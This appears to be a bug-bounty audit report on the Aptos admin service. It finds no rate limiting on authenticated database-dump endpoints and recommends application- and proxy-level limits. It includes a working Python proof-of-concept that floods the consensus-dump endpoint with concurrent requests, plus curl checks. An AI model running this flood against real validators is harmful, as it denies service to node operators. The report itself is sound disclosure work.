# Audit Report

## Title
Admin Service Missing Rate Limiting Allows Authenticated DoS via Database Dump Request Flooding

## Summary
The Aptos admin service (`aptos-admin-service`) implements authentication but lacks any rate limiting mechanism on authenticated requests. An attacker who obtains valid authentication credentials can flood the service with thousands of expensive database dump requests per second, exhausting the blocking thread pool and causing denial of service for legitimate administrative operations and potential validator performance degradation.

## Finding Description

The admin service provides several database dump endpoints (`/debug/consensus/consensusdb`, `/debug/consensus/quorumstoredb`, `/debug/consensus/block`) that perform expensive read operations on consensus and quorum store databases. While these endpoints require authentication via SHA-256 passcode verification, there is no rate limiting implemented at any level.

**Missing Application-Level Rate Limiting:**

The `AdminServiceConfig` structure contains no rate limiting configuration fields: [1](#0-0) 

The `serve_requests` function performs only authentication checks before routing to handlers, with no rate limiting logic: [2](#0-1) 

After authentication passes, requests are directly routed to expensive database dump handlers: [3](#0-2) 

**Expensive Database Operations:**

The database dump handlers perform computationally expensive operations that read entire database contents:

1. `dump_consensus_db` reads all consensus blocks, quorum certificates, and votes: [4](#0-3) 

2. `dump_quorum_store_db` can read all batches from the quorum store: [5](#0-4) 

3. `dump_blocks` extracts all blocks and transactions: [6](#0-5) 

Each of these handlers spawns a blocking task via `spawn_blocking`: [7](#0-6) 

**Limited Thread Pool Protection:**

The only protection is the tokio runtime's blocking thread pool limit of 64 threads, which is shared across all admin service operations: [8](#0-7) 

**No Infrastructure-Level Rate Limiting:**

The HAProxy configuration for the validator admin service only implements IP-based blocking but no request rate limiting or bandwidth limiting: [9](#0-8) 

**Attack Scenario:**

1. Attacker obtains valid admin service credentials (SHA-256 passcode)
2. Attacker sends rapid HTTP requests (e.g., 1000+ requests/second) to `/debug/consensus/consensusdb?passcode=<valid_passcode>`
3. Each request passes authentication check and queues a `spawn_blocking` task
4. The 64-thread blocking pool saturates within milliseconds
5. Database read operations pile up, causing contention on consensus and quorum store databases
6. Legitimate admin operations (profiling, thread dumps, etc.) are blocked or severely delayed
7. Database contention may impact validator's normal consensus operations
8. Network bandwidth saturates with large database dump responses

This violates the **Resource Limits** invariant: "All operations must respect gas, storage, and computational limits."

## Impact Explanation

**Severity: Medium** (aligns with Aptos Bug Bounty Medium category - up to $10,000)

This vulnerability can cause:

1. **API Denial of Service**: Complete unavailability of the admin service for legitimate operators
2. **Validator Node Slowdown**: Database contention from concurrent dump operations can degrade consensus performance
3. **Resource Exhaustion**: Saturation of the blocking thread pool prevents other blocking operations
4. **Network Bandwidth Exhaustion**: Large dump responses can saturate network interfaces

The impact is categorized as Medium rather than High because:
- Requires valid authentication credentials (not publicly exploitable)
- Does not directly cause consensus safety violations or fund loss
- Does not cause permanent network partition or total liveness failure
- Validator can recover once attack stops

However, it qualifies as Medium severity per the bug bounty criteria for "Validator node slowdowns" and "State inconsistencies requiring intervention" if database contention impacts normal operations.

## Likelihood Explanation

**Likelihood: High**

The attack is highly likely to occur if an attacker obtains valid credentials because:

1. **Low Complexity**: Simple HTTP flood attack requiring only authenticated HTTP requests
2. **No Special Skills**: Standard HTTP client tools (curl, wget, custom scripts) can execute the attack
3. **Immediate Impact**: Thread pool saturation occurs within seconds of attack initiation
4. **Credential Exposure Risk**: Admin service credentials may be exposed through:
   - Configuration file leaks
   - Insider threats
   - Compromised systems with access to passcodes
5. **No Detection/Prevention**: No logging or alerting on request rate anomalies

The only barrier is obtaining authentication credentials, but once obtained, exploitation is trivial and immediate.

## Recommendation

Implement multi-layered rate limiting to prevent abuse:

**1. Application-Level Rate Limiting:**

Add rate limiting configuration to `AdminServiceConfig`:

```rust
// In config/src/config/admin_service_config.rs
#[derive(Clone, Debug, Deserialize, PartialEq, Eq, Serialize)]
#[serde(default, deny_unknown_fields)]
pub struct AdminServiceConfig {
    pub enabled: Option<bool>,
    pub address: String,
    pub port: u16,
    pub authentication_configs: Vec<AuthenticationConfig>,
    pub malloc_stats_max_len: usize,
    // NEW: Rate limiting configuration
    pub rate_limit_requests_per_minute: Option<usize>,
    pub rate_limit_per_endpoint: Option<bool>,
}
```

Integrate the existing `TokenBucketRateLimiter` in `serve_requests`:

```rust
// In crates/aptos-admin-service/src/server/mod.rs
use aptos_rate_limiter::rate_limit::TokenBucketRateLimiter;

pub struct Context {
    config: AdminServiceConfig,
    aptos_db: RwLock<Option<Arc<DbReaderWriter>>>,
    consensus_db: RwLock<Option<Arc<StorageWriteProxy>>>,
    quorum_store_db: RwLock<Option<Arc<QuorumStoreDB>>>,
    mempool_client_sender: RwLock<Option<MempoolClientSender>>,
    // NEW: Rate limiter per endpoint or per IP
    rate_limiter: Option<Arc<TokenBucketRateLimiter<String>>>,
}

async fn serve_requests(
    context: Arc<Context>,
    req: Request<Body>,
    enabled: bool,
) -> hyper::Result<Response<Body>> {
    // ... existing authentication logic ...
    
    // NEW: Apply rate limiting after authentication
    if let Some(rate_limiter) = &context.rate_limiter {
        let key = format!("{}-{}", req.uri().path(), remote_addr_or_authenticated_user);
        let bucket = rate_limiter.bucket(key);
        
        if let Err(wait_time) = bucket.lock().acquire_tokens(1) {
            return Ok(reply_with_status(
                StatusCode::TOO_MANY_REQUESTS,
                format!("Rate limit exceeded. Try again at {:?}", wait_time),
            ));
        }
    }
    
    // ... existing request routing ...
}
```

**2. Infrastructure-Level Rate Limiting:**

Add HAProxy request rate limiting to the validator-admin frontend:

```haproxy
## Specify the validator admin frontend
frontend validator-admin
    mode http
    option httplog
    bind :9202
    default_backend validator-admin

    # Deny requests from blocked IPs
    tcp-request connection reject if { src -n -f /usr/local/etc/haproxy/blocked.ips }

    # NEW: Rate limiting - max 10 requests per minute per IP
    stick-table type ip size 100k expire 1m store http_req_rate(1m)
    http-request track-sc0 src
    http-request deny deny_status 429 if { sc_http_req_rate(0) gt 10 }

    ## Add the forwarded header
    http-request add-header Forwarded "for=%ci"
```

**3. Per-Endpoint Specific Limits:**

Implement stricter limits for expensive database dump operations:

```rust
// Different rate limits per endpoint type
match (req.method().clone(), req.uri().path()) {
    (hyper::Method::GET, path) if path.starts_with("/debug/") => {
        // Stricter limit for DB dumps: 1 request per minute
        if !check_db_dump_rate_limit(&context, remote_addr) {
            return Ok(reply_with_status(
                StatusCode::TOO_MANY_REQUESTS,
                "DB dump rate limit: 1 request per minute",
            ));
        }
    },
    _ => {}
}
```

**4. Add Monitoring and Alerting:**

```rust
// Log rate limit violations
aptos_logger::warn!(
    remote_addr = remote_addr,
    endpoint = req.uri().path(),
    "Admin service rate limit exceeded"
);

// Emit metrics for monitoring
ADMIN_RATE_LIMIT_VIOLATIONS
    .with_label_values(&[req.uri().path()])
    .inc();
```

## Proof of Concept

```python
#!/usr/bin/env python3
"""
PoC: Admin Service DoS via Database Dump Request Flooding

Prerequisites:
- Admin service enabled with authentication
- Valid SHA-256 passcode obtained
- Target: validator node running admin service on port 9102
"""

import requests
import hashlib
import concurrent.futures
import time

# Configuration
TARGET_HOST = "http://validator-node:9102"
PASSCODE = "admin_secret_passcode"
PASSCODE_SHA256 = hashlib.sha256(PASSCODE.encode()).hexdigest()
NUM_CONCURRENT_REQUESTS = 100
DURATION_SECONDS = 60

def send_db_dump_request(request_id):
    """Send a single DB dump request"""
    endpoint = f"{TARGET_HOST}/debug/consensus/consensusdb?passcode={PASSCODE}"
    try:
        start_time = time.time()
        response = requests.get(endpoint, timeout=30)
        elapsed = time.time() - start_time
        
        print(f"[{request_id}] Status: {response.status_code}, "
              f"Time: {elapsed:.2f}s, Size: {len(response.content)} bytes")
        
        return response.status_code, elapsed
    except Exception as e:
        print(f"[{request_id}] ERROR: {e}")
        return None, None

def main():
    print(f"Starting DoS attack on {TARGET_HOST}")
    print(f"Concurrent requests: {NUM_CONCURRENT_REQUESTS}")
    print(f"Duration: {DURATION_SECONDS} seconds")
    print(f"Target endpoint: /debug/consensus/consensusdb")
    print("-" * 60)
    
    request_id = 0
    start_attack = time.time()
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=NUM_CONCURRENT_REQUESTS) as executor:
        futures = []
        
        while time.time() - start_attack < DURATION_SECONDS:
            # Submit new requests to maintain pressure
            for _ in range(NUM_CONCURRENT_REQUESTS):
                futures.append(executor.submit(send_db_dump_request, request_id))
                request_id += 1
            
            # Brief pause between waves
            time.sleep(0.1)
        
        # Wait for completion
        concurrent.futures.wait(futures)
    
    print("-" * 60)
    print(f"Attack completed. Sent {request_id} total requests.")
    print("Expected impact:")
    print("- Admin service blocking thread pool saturated (64 threads)")
    print("- Legitimate admin operations blocked")
    print("- Database read contention impacting validator")
    print("- Network bandwidth potentially saturated with large responses")

if __name__ == "__main__":
    main()
```

**Expected Results:**

1. Within 1-2 seconds: All 64 blocking threads saturated with DB dump operations
2. After 5 seconds: Legitimate admin requests (e.g., `/profilez`) return timeout errors
3. After 10 seconds: Database read latency increases, visible in consensus metrics
4. After 30 seconds: Network bandwidth saturated with dump responses (multiple MB/s)
5. After 60 seconds: Admin service essentially unavailable to legitimate operators

**Verification:**

```bash
# Monitor blocking thread pool saturation
curl "http://validator-node:9102/threadz?passcode=<passcode>" | grep "spawn_blocking"

# Attempt legitimate admin operation during attack (will timeout/fail)
curl "http://validator-node:9102/profilez?passcode=<passcode>&seconds=10"

# Check validator consensus metrics for degradation
curl "http://validator-node:9101/metrics" | grep consensus_duration
```

## Notes

**Additional Context:**

1. **Existing Rate Limiter Available**: The codebase already contains a fully-functional `TokenBucketRateLimiter` implementation that could be integrated: [10](#0-9) 

2. **Authentication Not Sufficient**: While the admin service requires authentication, this only gates accessâ€”it does not prevent abuse by authenticated users: [11](#0-10) 

3. **Production Impact**: On mainnet validators, this vulnerability could be exploited by:
   - Compromised operator credentials
   - Malicious insiders with admin access
   - Stolen passcodes from configuration leaks

4. **Defense in Depth Needed**: Rate limiting should be implemented at multiple layers (application + infrastructure) as each provides different protection benefits.

### Citations

**File:** config/src/config/admin_service_config.rs (L15-24)
```rust
#[derive(Clone, Debug, Deserialize, PartialEq, Eq, Serialize)]
#[serde(default, deny_unknown_fields)]
pub struct AdminServiceConfig {
    pub enabled: Option<bool>,
    pub address: String,
    pub port: u16,
    // If empty, will allow all requests without authentication. (Not allowed on mainnet.)
    pub authentication_configs: Vec<AuthenticationConfig>,
    pub malloc_stats_max_len: usize,
}
```

**File:** crates/aptos-admin-service/src/server/mod.rs (L142-181)
```rust
    async fn serve_requests(
        context: Arc<Context>,
        req: Request<Body>,
        enabled: bool,
    ) -> hyper::Result<Response<Body>> {
        if !enabled {
            return Ok(reply_with_status(
                StatusCode::NOT_FOUND,
                "AdminService is not enabled.",
            ));
        }

        let mut authenticated = false;
        if context.config.authentication_configs.is_empty() {
            authenticated = true;
        } else {
            for authentication_config in &context.config.authentication_configs {
                match authentication_config {
                    AuthenticationConfig::PasscodeSha256(passcode_sha256) => {
                        let query = req.uri().query().unwrap_or("");
                        let query_pairs: HashMap<_, _> =
                            url::form_urlencoded::parse(query.as_bytes()).collect();
                        let passcode: Option<String> =
                            query_pairs.get("passcode").map(|p| p.to_string());
                        if let Some(passcode) = passcode {
                            if sha256::digest(passcode) == *passcode_sha256 {
                                authenticated = true;
                            }
                        }
                    },
                }
            }
        };

        if !authenticated {
            return Ok(reply_with_status(
                StatusCode::NETWORK_AUTHENTICATION_REQUIRED,
                format!("{} endpoint requires authentication.", req.uri().path()),
            ));
        }
```

**File:** crates/aptos-admin-service/src/server/mod.rs (L183-243)
```rust
        match (req.method().clone(), req.uri().path()) {
            #[cfg(target_os = "linux")]
            (hyper::Method::GET, "/profilez") => handle_cpu_profiling_request(req).await,
            #[cfg(target_os = "linux")]
            (hyper::Method::GET, "/threadz") => handle_thread_dump_request(req).await,
            #[cfg(unix)]
            (hyper::Method::GET, "/malloc/stats") => {
                malloc::handle_malloc_stats_request(context.config.malloc_stats_max_len)
            },
            #[cfg(unix)]
            (hyper::Method::GET, "/malloc/dump_profile") => malloc::handle_dump_profile_request(),
            (hyper::Method::GET, "/debug/consensus/consensusdb") => {
                let consensus_db = context.consensus_db.read().clone();
                if let Some(consensus_db) = consensus_db {
                    consensus::handle_dump_consensus_db_request(req, consensus_db).await
                } else {
                    Ok(reply_with_status(
                        StatusCode::NOT_FOUND,
                        "Consensus db is not available.",
                    ))
                }
            },
            (hyper::Method::GET, "/debug/consensus/quorumstoredb") => {
                let quorum_store_db = context.quorum_store_db.read().clone();
                if let Some(quorum_store_db) = quorum_store_db {
                    consensus::handle_dump_quorum_store_db_request(req, quorum_store_db).await
                } else {
                    Ok(reply_with_status(
                        StatusCode::NOT_FOUND,
                        "Quorum store db is not available.",
                    ))
                }
            },
            (hyper::Method::GET, "/debug/consensus/block") => {
                let consensus_db = context.consensus_db.read().clone();
                let quorum_store_db = context.quorum_store_db.read().clone();
                if let Some(consensus_db) = consensus_db
                    && let Some(quorum_store_db) = quorum_store_db
                {
                    consensus::handle_dump_block_request(req, consensus_db, quorum_store_db).await
                } else {
                    Ok(reply_with_status(
                        StatusCode::NOT_FOUND,
                        "Consensus db and/or quorum store db is not available.",
                    ))
                }
            },
            (hyper::Method::GET, "/debug/mempool/parking-lot/addresses") => {
                let mempool_client_sender = context.mempool_client_sender.read().clone();
                if let Some(mempool_client_sender) = mempool_client_sender {
                    mempool::mempool_handle_parking_lot_address_request(req, mempool_client_sender)
                        .await
                } else {
                    Ok(reply_with_status(
                        StatusCode::NOT_FOUND,
                        "Mempool parking lot is not available.",
                    ))
                }
            },
            _ => Ok(reply_with_status(StatusCode::NOT_FOUND, "Not found.")),
        }
```

**File:** crates/aptos-admin-service/src/server/consensus/mod.rs (L17-38)
```rust
pub async fn handle_dump_consensus_db_request(
    _req: Request<Body>,
    consensus_db: Arc<dyn PersistentLivenessStorage>,
) -> hyper::Result<Response<Body>> {
    info!("Dumping consensus db.");

    match spawn_blocking(move || dump_consensus_db(consensus_db.as_ref())).await {
        Ok(result) => {
            info!("Finished dumping consensus db.");
            let headers: Vec<(_, HeaderValue)> =
                vec![(CONTENT_LENGTH, HeaderValue::from(result.len()))];
            Ok(reply_with(headers, result))
        },
        Err(e) => {
            info!("Failed to dump consensus db: {e:?}");
            Ok(reply_with_status(
                StatusCode::INTERNAL_SERVER_ERROR,
                e.to_string(),
            ))
        },
    }
}
```

**File:** crates/aptos-admin-service/src/server/consensus/mod.rs (L130-156)
```rust
fn dump_consensus_db(consensus_db: &dyn PersistentLivenessStorage) -> anyhow::Result<String> {
    let mut body = String::new();

    let (last_vote, highest_tc, consensus_blocks, consensus_qcs) =
        consensus_db.consensus_db().get_data()?;

    body.push_str(&format!("Last vote: \n{last_vote:?}\n\n"));
    body.push_str(&format!("Highest tc: \n{highest_tc:?}\n\n"));
    body.push_str("Blocks: \n");
    for block in consensus_blocks {
        body.push_str(&format!(
            "[id: {:?}, author: {:?}, epoch: {}, round: {:02}, parent_id: {:?}, timestamp: {}, payload: {:?}]\n\n",
            block.id(),
            block.author(),
            block.epoch(),
            block.round(),
            block.parent_id(),
            block.timestamp_usecs(),
            block.payload(),
        ));
    }
    body.push_str("QCs: \n");
    for qc in consensus_qcs {
        body.push_str(&format!("{qc:?}\n\n"));
    }
    Ok(body)
}
```

**File:** crates/aptos-admin-service/src/server/consensus/mod.rs (L158-177)
```rust
fn dump_quorum_store_db(
    quorum_store_db: &dyn QuorumStoreStorage,
    digest: Option<HashValue>,
) -> anyhow::Result<String> {
    let mut body = String::new();

    if let Some(digest) = digest {
        body.push_str(&format!("{digest:?}:\n"));
        body.push_str(&format!(
            "{:?}",
            quorum_store_db.get_batch(&digest).map_err(Error::msg)?
        ));
    } else {
        for (digest, _batch) in quorum_store_db.get_all_batches()? {
            body.push_str(&format!("{digest:?}:\n"));
        }
    }

    Ok(body)
}
```

**File:** crates/aptos-admin-service/src/server/consensus/mod.rs (L179-215)
```rust
fn dump_blocks(
    consensus_db: &dyn PersistentLivenessStorage,
    quorum_store_db: &dyn QuorumStoreStorage,
    block_id: Option<HashValue>,
) -> anyhow::Result<String> {
    let mut body = String::new();

    let all_batches = quorum_store_db.get_all_batches()?;

    let (_, _, blocks, _) = consensus_db.consensus_db().get_data()?;

    for block in blocks {
        let id = block.id();
        if block_id.is_none() || id == block_id.unwrap() {
            body.push_str(&format!("Block ({id:?}): \n\n"));
            match extract_txns_from_block(&block, &all_batches) {
                Ok(txns) => {
                    body.push_str(&format!("{txns:?}"));
                },
                Err(e) => {
                    body.push_str(&format!("Not available: {e:?}"));
                },
            };
            body.push_str("\n\n");
        }
    }

    if body.is_empty() {
        if let Some(block_id) = block_id {
            body.push_str(&format!("Done, block ({block_id:?}) is not found."));
        } else {
            body.push_str("Done, no block is found.");
        }
    }

    Ok(body)
}
```

**File:** crates/aptos-runtimes/src/lib.rs (L27-50)
```rust
    const MAX_BLOCKING_THREADS: usize = 64;

    // Verify the given name has an appropriate length
    if thread_name.len() > MAX_THREAD_NAME_LENGTH {
        panic!(
            "The given runtime thread name is too long! Max length: {}, given name: {}",
            MAX_THREAD_NAME_LENGTH, thread_name
        );
    }

    // Create the runtime builder
    let atomic_id = AtomicUsize::new(0);
    let thread_name_clone = thread_name.clone();
    let mut builder = Builder::new_multi_thread();
    builder
        .thread_name_fn(move || {
            let id = atomic_id.fetch_add(1, Ordering::SeqCst);
            format!("{}-{}", thread_name_clone, id)
        })
        .on_thread_start(on_thread_start)
        .disable_lifo_slot()
        // Limit concurrent blocking tasks from spawn_blocking(), in case, for example, too many
        // Rest API calls overwhelm the node.
        .max_blocking_threads(MAX_BLOCKING_THREADS)
```

**File:** terraform/helm/aptos-node/files/haproxy.cfg (L110-126)
```text
## Specify the validator admin frontend
frontend validator-admin
    mode http
    option httplog
    bind :9202
    default_backend validator-admin

    # Deny requests from blocked IPs
    tcp-request connection reject if { src -n -f /usr/local/etc/haproxy/blocked.ips }

    ## Add the forwarded header
    http-request add-header Forwarded "for=%ci"

## Specify the validator admin backend
backend validator-admin
    mode http
    server {{ include "aptos-validator.fullname" $ }}-{{ $.Values.i }}-validator {{ include "aptos-validator.fullname" $ }}-{{ $.Values.i }}-validator:9102
```

**File:** crates/aptos-rate-limiter/src/rate_limit.rs (L54-89)
```rust
pub struct TokenBucketRateLimiter<Key: Eq + Hash + Clone + Debug> {
    label: &'static str,
    log_info: String,
    buckets: RwLock<HashMap<Key, SharedBucket>>,
    new_bucket_start_percentage: u8,
    default_bucket_size: usize,
    default_fill_rate: usize,
    enabled: bool,
    metrics: Option<HistogramVec>,
}

impl<Key: Eq + Hash + Clone + Debug> TokenBucketRateLimiter<Key> {
    pub fn new(
        label: &'static str,
        log_info: String,
        new_bucket_start_percentage: u8,
        default_bucket_size: usize,
        default_fill_rate: usize,
        metrics: Option<HistogramVec>,
    ) -> Self {
        // Ensure that we can actually use the rate limiter
        assert!(new_bucket_start_percentage <= 100);
        assert!(default_bucket_size > 0);
        assert!(default_fill_rate > 0);

        Self {
            label,
            log_info,
            buckets: RwLock::new(HashMap::new()),
            new_bucket_start_percentage,
            default_bucket_size,
            default_fill_rate,
            enabled: true,
            metrics,
        }
    }
```
